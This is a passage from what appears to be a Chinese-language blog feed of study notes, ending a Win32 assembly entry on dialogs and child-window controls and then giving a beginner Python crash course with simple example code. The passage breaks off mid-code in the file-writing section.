src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718091807097.png" alt="image-20230718091807097"></p></li><li><p>tab停留位</p><p>就是使用tab经行焦点的转变</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718092232261.png" alt="image-20230718092232261"></p></li><li><p>使用对话框</p><ul><li><p>创建部分和对话框过程（回调函数）的部分</p></li><li><p>创建模态对话框</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718092717495.png" alt="image-20230718092717495"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718092900612.png" alt="image-20230718092900612"></p></li><li><p>结束模态对话框</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718093002726.png" alt="image-20230718093002726"></p></li><li><p>创建非模块对话框</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718093104742.png" alt="image-20230718093104742"></p></li><li><p>两个创建函数的不同</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718093413292.png" alt="image-20230718093413292"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718093437707.png" alt="image-20230718093437707"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718093446473.png" alt="image-20230718093446473"></p></li></ul></li></ol><h2 id="使用子窗口控件"><a href="#使用子窗口控件" class="headerlink" title="使用子窗口控件"></a>使用子窗口控件</h2><h2 id="子窗口的控件"><a href="#子窗口的控件" class="headerlink" title="子窗口的控件"></a>子窗口的控件</h2><ol><li><p>定义</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718103357430.png" alt="image-20230718103357430"></p></li><li><p>通用的使用方法</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718104005759.png" alt="image-20230718104005759"></p><ul><li><p>通过id获取句柄</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718104141640.png" alt="image-20230718104141640"></p></li><li><p>向控件发送信息</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718104314711.png" alt="image-20230718104314711"></p><p>其中的换行符出现了错误</p></li><li><p>使用单选钮和复选框</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718104605311.png" alt="image-20230718104605311"></p></li><li><p>使用静态控件</p><p>不向对话框发送信息</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718105309632.png" alt="image-20230718105309632"></p><p>可以用来构造简单的线条图形</p></li><li><p>使用文本编辑控件</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718111110387.png" alt="image-20230718111110387"></p></li><li><p>使用滚动条、</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718112856487.png" alt="image-20230718112856487"></p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718112937397.png" alt="image-20230718112937397"></p><p>发送信息获取返回</p><p><img src="https://compilation-1317182407.cos.ap-nanjing.myqcloud.com/win32%E6%B1%87%E7%BC%96/image-20230718113658053.png" alt="image-20230718113658053"></p></li></ul></li></ol><h2 id="字符串资源"><a href="#字符串资源" class="headerlink" title="字符串资源"></a>字符串资源</h2>]]></content>
    
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>py速成学习</title>
    <link href="/2023/07/13/python/py%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/07/13/python/py%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="print"><a href="#print" class="headerlink" title="print"></a>print</h2><ol><li><p>使用print</p><ul><li><p>hello world</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hello world&quot;</span>)<br></code></pre></td></tr></table></figure><p>值得注意的是使用py的打印函数是<code>printf</code>并没有<code>f</code></p><p>py是一门脚本语言所以我们写一句话也是可以运行出结果的</p></li><li><p>字符串怕拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hello&quot;</span>+<span class="hljs-string">&quot; world&quot;</span>)<br></code></pre></td></tr></table></figure></li><li><p>换行和打印多行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;&quot;床前明月光，</span><br><span class="hljs-string">疑是地上霜。 </span><br><span class="hljs-string">举头望明月，</span><br><span class="hljs-string">低头思故乡。&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>这个是和c不同的</p></li></ul></li></ol><h2 id="赋值和创建一个变量"><a href="#赋值和创建一个变量" class="headerlink" title="赋值和创建一个变量"></a>赋值和创建一个变量</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;this is a string&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>str1 = <span class="hljs-string">&quot;string &quot;</span><br>str2=str1<br><span class="hljs-built_in">print</span>(str1) <span class="hljs-comment"># string</span><br></code></pre></td></tr></table></figure><h2 id="运算符知识"><a href="#运算符知识" class="headerlink" title="运算符知识"></a>运算符知识</h2><ol><li><p>基本和C语言一致</p></li><li><p>不同或补充</p><ul><li><p><code>**</code>乘方符号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">2</span>**<span class="hljs-number">3</span>  <span class="hljs-comment"># 2的3次方</span><br></code></pre></td></tr></table></figure></li></ul></li></ol><h2 id="导入库"><a href="#导入库" class="headerlink" title="导入库"></a>导入库</h2><ol><li><p>使用<code>import</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 例如</span><br><span class="hljs-keyword">import</span> math<br><span class="hljs-comment"># 导入math的库，这个库是与数学计算有关的库</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> sin<br><span class="hljs-comment"># 从math中导入sin</span><br></code></pre></td></tr></table></figure></li></ol><h2 id="基础数据类型"><a href="#基础数据类型" class="headerlink" title="基础数据类型"></a>基础数据类型</h2><ol><li><p>字符串</p><p>基本和c++一样</p><ul><li><p><code>len</code></p><p>求字符串长度</p></li><li><p><code>[]</code></p><p>使用索引得到字符</p></li></ul></li><li><p>浮点型只有<code>float</code></p></li><li><p>布尔类型</p><p>必须是大写开始</p><p><code>True</code></p><p><code>False</code></p></li><li><p>使用type()打印当前变量的类型</p></li></ol><h2 id="获取用户的输入"><a href="#获取用户的输入" class="headerlink" title="获取用户的输入"></a>获取用户的输入</h2><ol><li><p>使用<code>input</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">int_num=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入一个整数：&quot;</span>))<br><span class="hljs-built_in">print</span>(int_num)<br></code></pre></td></tr></table></figure><p>使用input读取用户的输入是一个string，所以我们使用int()函数转换成int才是我们需要的Int_num</p><p>同样的转换函数还有很多比如<code>float</code>等都是将</p></li></ol><h2 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 判断语句</span><br><br><span class="hljs-comment"># is_true=bool(input(&quot;input bool:&quot;))</span><br>int_num=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;please input a num:&quot;</span>))<br><br><br><span class="hljs-keyword">if</span> int_num&lt;<span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&lt;0&quot;</span>)<br><span class="hljs-keyword">elif</span> <span class="hljs-number">0</span>&lt;=int_num&lt;<span class="hljs-number">100</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&lt;=0 and &lt;100&quot;</span>) <span class="hljs-comment"># 请注意判断的写法</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&gt;=100&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2><ol><li><p>与C语言不一样</p><ul><li><code>and</code> 与  &#x3D;&#x3D; <code>&amp;</code></li><li><code>or</code> 或 &#x3D;&#x3D;<code>|</code></li><li><code>not</code>  非 &#x3D;&#x3D;<code>!</code></li></ul><p>所谓的不同都是符号发生了变化，本质并没有很大的变化</p></li></ol><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><ol><li><p>列表是可变的</p></li><li><p>创建和使用列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 列表</span><br>   <br><span class="hljs-built_in">list</span>=[<span class="hljs-string">&quot;信安&quot;</span>,<span class="hljs-string">&quot;实验班&quot;</span>,<span class="hljs-string">&quot;物理网&quot;</span>,<span class="hljs-string">&quot;网工&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><span class="hljs-comment"># 添加元素</span><br><span class="hljs-built_in">list</span>.append(<span class="hljs-string">&quot;网安&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><span class="hljs-comment"># 删除元素</span><br><span class="hljs-built_in">list</span>.remove(<span class="hljs-string">&quot;网安&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><span class="hljs-comment"># 求长度</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>))<br><span class="hljs-comment"># 通过索引得到元素</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>[<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure></li></ol><h2 id="键值对的使用"><a href="#键值对的使用" class="headerlink" title="键值对的使用"></a>键值对的使用</h2> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"> <br><span class="hljs-comment"># 普通的键值对</span><br>key_value1=&#123;<span class="hljs-string">&quot;chg&quot;</span>:<span class="hljs-number">1</span>,<br>            <span class="hljs-string">&quot;zjy&quot;</span>:<span class="hljs-number">2</span>,<br>            <span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">3</span>&#125;<br><span class="hljs-built_in">print</span>(key_value1[<span class="hljs-string">&quot;chg&quot;</span>])<br> <br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(key_value1))<span class="hljs-comment"># 有几个键值对</span><br>key_value1[<span class="hljs-string">&quot;test2&quot;</span>]=<span class="hljs-number">4</span> <span class="hljs-comment"># 添加键值对</span><br><span class="hljs-built_in">print</span>(key_value1[<span class="hljs-string">&quot;test2&quot;</span>])<br> <br><span class="hljs-comment"># 判断是否存在</span><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxx&quot;</span> <span class="hljs-keyword">in</span> key_value1:<br>    <span class="hljs-built_in">print</span>(key_value1[<span class="hljs-string">&quot;chg&quot;</span>])<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;don&#x27;t hava&quot;</span>)<br>    <br><span class="hljs-comment"># 加入元组的键值对，元组不可更改</span><br>key_value2=&#123;(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;chg&quot;</span>):<span class="hljs-string">&quot;man&quot;</span>,<br>            (<span class="hljs-number">2</span>,<span class="hljs-string">&quot;test1&quot;</span>):<span class="hljs-string">&quot;man&quot;</span>,<br>            (<span class="hljs-number">3</span>,<span class="hljs-string">&quot;test2&quot;</span>):<span class="hljs-string">&quot;woman&quot;</span>&#125;<br> <br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> key_value2.items():<br>    <span class="hljs-built_in">print</span>(k)<br></code></pre></td></tr></table></figure><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><ul><li><p><code>for</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 键值对和元组的使用</span><br>  <br><span class="hljs-comment"># 普通的键值对</span><br>key_value1=&#123;<span class="hljs-string">&quot;chg&quot;</span>:<span class="hljs-number">1</span>,<br>            <span class="hljs-string">&quot;zjy&quot;</span>:<span class="hljs-number">2</span>,<br>            <span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">3</span>&#125;<br><span class="hljs-built_in">print</span>(key_value1[<span class="hljs-string">&quot;chg&quot;</span>])<br>  <br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(key_value1))<span class="hljs-comment"># 有几个键值对</span><br>key_value1[<span class="hljs-string">&quot;test2&quot;</span>]=<span class="hljs-number">4</span> <span class="hljs-comment"># 添加键值对</span><br><span class="hljs-built_in">print</span>(key_value1[<span class="hljs-string">&quot;test2&quot;</span>])<br>  <br><span class="hljs-comment"># 判断是否存在</span><br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxx&quot;</span> <span class="hljs-keyword">in</span> key_value1:<br>    <span class="hljs-built_in">print</span>(key_value1[<span class="hljs-string">&quot;chg&quot;</span>])<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;don&#x27;t hava&quot;</span>)<br>  <br>  <br><span class="hljs-comment"># 使用循环打印键值对</span><br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> key_value1.keys(): <span class="hljs-comment"># .key()方法是读取出所有的key。还有/value是读取所有值。使用.item是读取所有的键值对</span><br>    <span class="hljs-built_in">print</span>(name)<br>  <br>  <br><span class="hljs-keyword">for</span> key_value <span class="hljs-keyword">in</span> key_value1.items():<span class="hljs-comment">#读取出来是一个元组</span><br>    <span class="hljs-built_in">print</span>(key_value)<br><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> key_value1.values():<br>    <span class="hljs-built_in">print</span>(num)<br>    <br>   <br>total = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">101</span>): <span class="hljs-comment"># 范围是0~100，括号左边的取不到 range()还有第三个参数表示步长</span><br>    total+=i<br>  <br><span class="hljs-built_in">print</span>(total)<br>  <br></code></pre></td></tr></table></figure></li><li><p><code>while()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">is_true=<span class="hljs-literal">True</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> is_true:<br>   i+=<span class="hljs-number">1</span><br>   <span class="hljs-keyword">if</span> i==<span class="hljs-number">100</span> :<br>       is_true=<span class="hljs-literal">False</span><br>  <br>  <br><span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure></li></ul><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">name=<span class="hljs-string">&quot;chg&quot;</span><br>school=<span class="hljs-string">&quot;CUIT&quot;</span><br>string_test1=<span class="hljs-string">&quot;&quot;&quot;&#123;name&#125; is a student in &#123;school&#125;&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(name=name,school=school)<br><span class="hljs-built_in">print</span>(string_test1)<br><br>string_test2=<span class="hljs-string">&quot;this is a test &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;string&quot;</span>)<br><span class="hljs-built_in">print</span>(string_test2)<br></code></pre></td></tr></table></figure><p><img src="https://python-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0image-20230714093050803.png" alt="image-20230714093050803"></p><h2 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a,b</span>):<br>    <span class="hljs-keyword">return</span> a+b<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(add(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>)))<br></code></pre></td></tr></table></figure><h2 id="导入第三方库"><a href="#导入第三方库" class="headerlink" title="导入第三方库"></a>导入第三方库</h2><ol><li>通过<code>pypi.org</code>网站查看库</li><li>通过<code>pip install 仓库名</code>安装</li><li>使用<code>import</code>引入</li></ol><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><ol><li><p>使用对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">   <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,<span class="hljs-built_in">id</span>,name</span>):<br>        self.<span class="hljs-built_in">id</span>=<span class="hljs-built_in">id</span><br>        self.name=name<br>        self.grades=&#123;<span class="hljs-string">&quot;语文&quot;</span>:<span class="hljs-number">0</span>,<br>                     <span class="hljs-string">&quot;数学&quot;</span>:<span class="hljs-number">1</span>,<br>                     <span class="hljs-string">&quot;英语&quot;</span>:<span class="hljs-number">2</span>&#125;<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_grades</span>(<span class="hljs-params">self,course,grade</span>):<br>        <span class="hljs-keyword">if</span> course <span class="hljs-keyword">in</span> self.grades:<br>            self.grades[course]=grade<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">print_grades</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">for</span> course <span class="hljs-keyword">in</span> self.grades:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;course&#125;</span>的成绩是<span class="hljs-subst">&#123;self.grades[course]&#125;</span>&quot;</span>)<br>   <br>chg=Student(<span class="hljs-string">&quot;10010&quot;</span>,<span class="hljs-string">&quot;chg&quot;</span>)<br><span class="hljs-built_in">print</span>(chg.<span class="hljs-built_in">id</span>)<br><span class="hljs-built_in">print</span>(chg.grades)<br>chg.set_grades(<span class="hljs-string">&quot;数学&quot;</span>,<span class="hljs-number">122</span>)<br><span class="hljs-built_in">print</span>(chg.grades)<br>chg.print_grades()<br></code></pre></td></tr></table></figure></li><li><p>继承</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,<span class="hljs-built_in">id</span>,name</span>):<br>        self.<span class="hljs-built_in">id</span>=<span class="hljs-built_in">id</span><br>        self.name=name<br>        self.grades=&#123;<span class="hljs-string">&quot;语文&quot;</span>:<span class="hljs-number">0</span>,<br>                     <span class="hljs-string">&quot;数学&quot;</span>:<span class="hljs-number">1</span>,<br>                     <span class="hljs-string">&quot;英语&quot;</span>:<span class="hljs-number">2</span>&#125;<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_grades</span>(<span class="hljs-params">self,course,grade</span>):<br>        <span class="hljs-keyword">if</span> course <span class="hljs-keyword">in</span> self.grades:<br>            self.grades[course]=grade<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">print_grades</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">for</span> course <span class="hljs-keyword">in</span> self.grades:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;course&#125;</span>的成绩是<span class="hljs-subst">&#123;self.grades[course]&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">do_homework</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;做作业&quot;</span>)<br>   <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pupils</span>(<span class="hljs-title class_ inherited__">Student</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,<span class="hljs-built_in">id</span>,name,other_subjects</span>):<br>        <span class="hljs-built_in">super</span>().__init__(<span class="hljs-built_in">id</span>,name)<span class="hljs-comment"># 调用构造函数</span><br>        self.other_subjects=other_subjects<br>   <br>   <br>   <br>   <br>chg=Student(<span class="hljs-string">&quot;10010&quot;</span>,<span class="hljs-string">&quot;chg&quot;</span>)<br><span class="hljs-built_in">print</span>(chg.<span class="hljs-built_in">id</span>)<br><span class="hljs-built_in">print</span>(chg.grades)<br>chg.set_grades(<span class="hljs-string">&quot;数学&quot;</span>,<span class="hljs-number">122</span>)<br><span class="hljs-built_in">print</span>(chg.grades)<br>chg.print_grades()<br>   <br>   <br><span class="hljs-comment"># 创建子类</span><br>test_student=Pupils(<span class="hljs-number">244</span>,<span class="hljs-string">&quot;test_student&quot;</span>,<span class="hljs-string">&quot;C语言&quot;</span>)<br><span class="hljs-built_in">print</span>(test_student.other_subjects)<br>   <br>   <br></code></pre></td></tr></table></figure></li></ol><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>文件读取的模式有一下几种</p><p><img src="https://python-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0image-20230714145153111.png" alt="image-20230714145153111"></p><ol><li><p>读文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">file=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C:\\Users\\12414\\Desktop\\test.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>   <br><span class="hljs-built_in">print</span>(file.readline())<span class="hljs-comment"># 读一行</span><br><span class="hljs-built_in">print</span>(file.read(<span class="hljs-number">10</span>))<br>file.seek(<span class="hljs-number">0</span>)<br>   <br>   <br><span class="hljs-comment"># 使用while读取文本</span><br><span class="hljs-built_in">str</span>=file.readline()<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">str</span>!=<span class="hljs-string">&quot;&quot;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br>    <span class="hljs-built_in">str</span>=file.readline()<br>   <br><span class="hljs-comment"># 使用列表</span><br>file.seek(<span class="hljs-number">0</span>)<br>lines=file.readlines()<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>    <span class="hljs-built_in">print</span>(line)<br>   <br>file.close()<br>   <br>   <br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C:\\Users\\12414\\Desktop\\test.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> file:<span class="hljs-comment"># 执行完后会自动关闭</span><br>    <span class="hljs-built_in">print</span>(file.readline())<br>   <br>   <br></code></pre></td></tr></table></figure></li><li><p>写文件</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C:\\Users\\12414\\Desktop\\test.txt&quot;</span>,<span 